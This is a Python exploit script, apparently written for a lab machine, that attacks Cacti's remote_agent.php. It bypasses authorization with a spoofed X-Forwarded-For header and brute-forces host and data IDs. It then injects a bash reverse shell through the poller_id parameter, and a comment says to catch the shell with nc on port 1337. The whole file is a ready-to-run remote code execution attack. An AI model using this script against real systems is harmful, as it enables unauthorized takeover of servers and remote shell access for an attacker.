import requests

target_ip = "http://10.129.206.57"

# your attack system ip
attacker_ip = "10.10.14.15"
attacker_port = "1337"
# Listen for the reverse shell in another window with nc -vlp 1337

# Functions and methods - don't edit below this line
_headers = { 'X-Forwarded-For':'127.0.0.1'}
payload = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"

def check_if_vulnerable(url):
	response = requests.get(f'{url}/remote_agent.php',headers=_headers)
	return (response.text != "FATAL: You are not authorized to use this service" and response.status_code == 200)

def find_vulnerable_ids(url):
	for host_id in range(1,10):
		for local_data_id in range(1,50):
			parameters = {
				'action':'polldata',
				'host_id':host_id,
				'local_data_ids[]':local_data_id
				}
			response = requests.get(f'{url}/remote_agent.php',headers=_headers,params=parameters)
			if (response.text != "[]"):
				dataName = response.json()[0]["rrd_name"]
				if((dataName=="uptime") or (dataName=="polling_time")):
					return host_id, local_data_id
	return -1,-1

def send_payload(url,host_id,data_id,payload):
	parameters = {
		'action':'polldata',
		'host_id':host_id,
		'local_data_ids[]':data_id,
		'poller_id':f";{payload}"
		}
	response = requests.get(f'{url}/remote_agent.php',headers=_headers,params=parameters)
	print(response.url)
	return response.text


# Main program
print(f"Victim IP: {target_ip}")
print(f"Attacker IP and port for reverse shell: {attacker_ip}{attacker_port}")
print(f"Full payload: {payload}")
print("--------------------------------")

# Check if vulnerable
if check_if_vulnerable(target_ip):
	print("Target appears to be vulnerable")
else:
	print("Target is not vulnerable")
	quit()

# Find vulnerable host id
print("Brute forcing id numbers...")
host_id, local_data_id = find_vulnerable_ids(target_ip)
if ((host_id!=-1) and (local_data_id!=-1)):
	print(f'host:{host_id} local_data_id:{local_data_id}')
else:
	print("No vulnerable local data ids were found.")
	quit()

# Exploit
print("Sending payload... cross your fingers!")
print(send_payload(target_ip,host_id,local_data_id,payload))
